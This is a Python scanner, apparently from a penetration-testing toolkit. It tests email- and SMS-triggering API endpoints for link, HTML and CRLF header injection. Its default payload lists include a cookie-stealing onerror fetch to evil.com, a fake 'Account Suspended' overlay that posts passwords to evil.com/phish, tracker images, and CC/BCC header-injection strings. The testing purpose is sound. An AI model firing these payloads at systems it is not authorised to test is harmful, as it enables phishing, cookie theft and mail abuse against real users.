#!/usr/bin/env python3
"""Notification Injection Scanner — Email/SMS header & content injection (CWE-74/79/93).

Tests link injection, HTML injection (tracker images, phishing overlays),
email header injection (CC/BCC via CRLF), in notification-triggering endpoints.

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from lib import (
    Finding, RateLimitedSession, get_session_from_env, log,
    parse_base_args, save_findings, load_config,
)

# ---------------------------------------------------------------------------
# Default payloads
# ---------------------------------------------------------------------------

DEFAULT_LINK_PAYLOADS = [
    "Check this: https://evil.com",
    '<a href="https://evil.com">Important update</a>',
    "[Click here](https://evil.com)",
]

DEFAULT_HTML_PAYLOADS = [
    '<img src="https://evil.com/tracker.gif" width="1" height="1">',
    '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">',
    '<table><tr><td style="background:url(https://evil.com/track)">',
    ('<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white">'
     '<h1>Account Suspended</h1><form action="https://evil.com/phish">'
     '<input name="email"><input name="password" type="password">'
     '<button>Verify</button></form></div>'),
]

DEFAULT_HEADER_PAYLOADS = [
    "victim@test.com\r\nCC: attacker@evil.com",
    "victim@test.com\nBCC: attacker@evil.com",
    "victim@test.com%0d%0aCC:%20attacker@evil.com",
    "test\r\nSubject: Urgent Security Alert\r\n\r\nYour account has been compromised",
]

# Endpoints that trigger email/SMS sending (generic patterns)
DEFAULT_EMAIL_ENDPOINTS = [
    {
        "name": "Appointment Booking",
        "path": "/api/appointments",
        "method": "POST",
        "email_fields": ["email", "notification_email", "patient_email"],
        "text_fields": ["comment", "message", "note", "reason"],
    },
    {
        "name": "Messaging",
        "path": "/api/messages",
        "method": "POST",
        "email_fields": ["to", "recipient"],
        "text_fields": ["content", "body", "subject", "message"],
    },
    {
        "name": "Invitation",
        "path": "/api/invitations",
        "method": "POST",
        "email_fields": ["email", "recipient_email"],
        "text_fields": ["message", "personal_message"],
    },
    {
        "name": "Password Reset",
        "path": "/account/reset_password",
        "method": "POST",
        "email_fields": ["email"],
        "text_fields": [],
    },
    {
        "name": "Profile Update",
        "path": "/api/users/me",
        "method": "PUT",
        "email_fields": ["email"],
        "text_fields": ["first_name", "last_name", "bio"],
    },
    {
        "name": "Contact Form",
        "path": "/api/contact",
        "method": "POST",
        "email_fields": ["email"],
        "text_fields": ["message", "subject", "body"],
    },
    {
        "name": "Share / Send",
        "path": "/api/share",
        "method": "POST",
        "email_fields": ["email", "recipient_email"],
        "text_fields": ["message"],
    },
]


def _send_payload(sess: RateLimitedSession, url: str, method: str,
                  field: str, payload: str, dry_run: bool) -> tuple[int, str] | None:
    """Send a single payload and return (status, snippet) or None."""
    if dry_run:
        log.info("[dry-run] %s %s {%s: <payload>}", method, url, field)
        return None
    try:
        body = {field: payload}
        if method == "POST":
            r = sess.post(url, json=body)
        else:
            r = sess.put(url, json=body)
        return r.status_code, r.text[:200]
    except Exception as e:
        log.debug("  %s %s [%s]: %s", method, url, field, e)
        return None


def test_link_injection(
    sess: RateLimitedSession, base: str, endpoints: list[dict],
    payloads: list[str], dry_run: bool,
) -> list[Finding]:
    """Test link injection in notification-triggering fields."""
    findings: list[Finding] = []
    for ep in endpoints:
        if not ep.get("text_fields"):
            continue
        url = f"{base}{ep['path']}"
        for field_name in ep["text_fields"]:
            result = _send_payload(sess, url, ep["method"], field_name, payloads[0], dry_run)
            if result and result[0] in (200, 201, 202):
                findings.append(Finding(
                    title=f"Link Injection via {field_name} — {ep['name']}",
                    severity="medium",
                    cwe="CWE-74",
                    endpoint=url,
                    method=ep["method"],
                    description=f"Link injection accepted via '{field_name}' on {ep['name']}.",
                    impact="Attacker can inject links in platform-sent emails.",
                    evidence={"field": field_name, "status": result[0]},
                ))
                log.warning("⚠ Link inject: %s → %s", ep["name"], field_name)
            if result:
                log.info("  %s %s [%s=link] → %d", ep["method"], ep["path"], field_name, result[0])
    return findings


def test_html_injection(
    sess: RateLimitedSession, base: str, endpoints: list[dict],
    payloads: list[str], dry_run: bool,
) -> list[Finding]:
    """Test HTML/image injection in email-generating fields."""
    findings: list[Finding] = []
    for ep in endpoints:
        if not ep.get("text_fields"):
            continue
        url = f"{base}{ep['path']}"
        for field_name in ep["text_fields"]:
            result = _send_payload(sess, url, ep["method"], field_name, payloads[0], dry_run)
            if result and result[0] in (200, 201, 202):
                findings.append(Finding(
                    title=f"HTML Injection in Email — {ep['name']}",
                    severity="high",
                    cwe="CWE-79",
                    endpoint=url,
                    method=ep["method"],
                    description=f"HTML injection (image tag) accepted via '{field_name}'.",
                    impact="Sophisticated email manipulation — image injection in platform emails.",
                    evidence={"field": field_name, "status": result[0]},
                ))
            if result:
                log.info("  %s %s [%s=html] → %d", ep["method"], ep["path"], field_name, result[0])
    return findings


def test_header_injection(
    sess: RateLimitedSession, base: str, endpoints: list[dict],
    payloads: list[str], dry_run: bool,
) -> list[Finding]:
    """Test email header injection (CC/BCC via CRLF)."""
    findings: list[Finding] = []
    for ep in endpoints:
        if not ep.get("email_fields"):
            continue
        url = f"{base}{ep['path']}"
        for field_name in ep["email_fields"]:
            for payload in payloads[:2]:
                result = _send_payload(sess, url, ep["method"], field_name, payload, dry_run)
                if result and result[0] in (200, 201, 202):
                    findings.append(Finding(
                        title=f"Email Header Injection — {ep['name']}",
                        severity="high",
                        cwe="CWE-93",
                        endpoint=url,
                        method=ep["method"],
                        description=f"CRLF injection accepted via '{field_name}'.",
                        impact="Attacker can inject CC/BCC headers in outgoing emails.",
                        evidence={"field": field_name, "status": result[0]},
                    ))
                    log.warning("⚠ Header inject: %s → %s", ep["name"], field_name)
                    break
                if result:
                    log.info("  %s %s [%s=header] → %d", ep["method"], ep["path"], field_name, result[0])
    return findings


def main() -> None:
    parser = parse_base_args()
    args = parser.parse_args()
    if args.verbose:
        log.setLevel("DEBUG")

    sess = get_session_from_env()
    base = args.target.rstrip("/")
    config = load_config(args.config)
    findings: list[Finding] = []

    endpoints = config.get("email_endpoints", DEFAULT_EMAIL_ENDPOINTS)
    link_payloads = config.get("link_payloads", DEFAULT_LINK_PAYLOADS)
    html_payloads = config.get("html_payloads", DEFAULT_HTML_PAYLOADS)
    header_payloads = config.get("header_payloads", DEFAULT_HEADER_PAYLOADS)

    log.info("=" * 60)
    log.info("Notification Injection Scanner (CWE-74, CWE-79, CWE-93)")
    log.info("Target: %s | Dry-run: %s | Endpoints: %d", base, args.dry_run, len(endpoints))
    log.info("=" * 60)

    log.info("[1/3] Link injection...")
    findings.extend(test_link_injection(sess, base, endpoints, link_payloads, args.dry_run))
    log.info("[2/3] HTML injection...")
    findings.extend(test_html_injection(sess, base, endpoints, html_payloads, args.dry_run))
    log.info("[3/3] Header injection...")
    findings.extend(test_header_injection(sess, base, endpoints, header_payloads, args.dry_run))

    log.info("=" * 60)
    log.info("Results: %d findings", len(findings))
    save_findings(findings, "notif-inject")


if __name__ == "__main__":
    main()
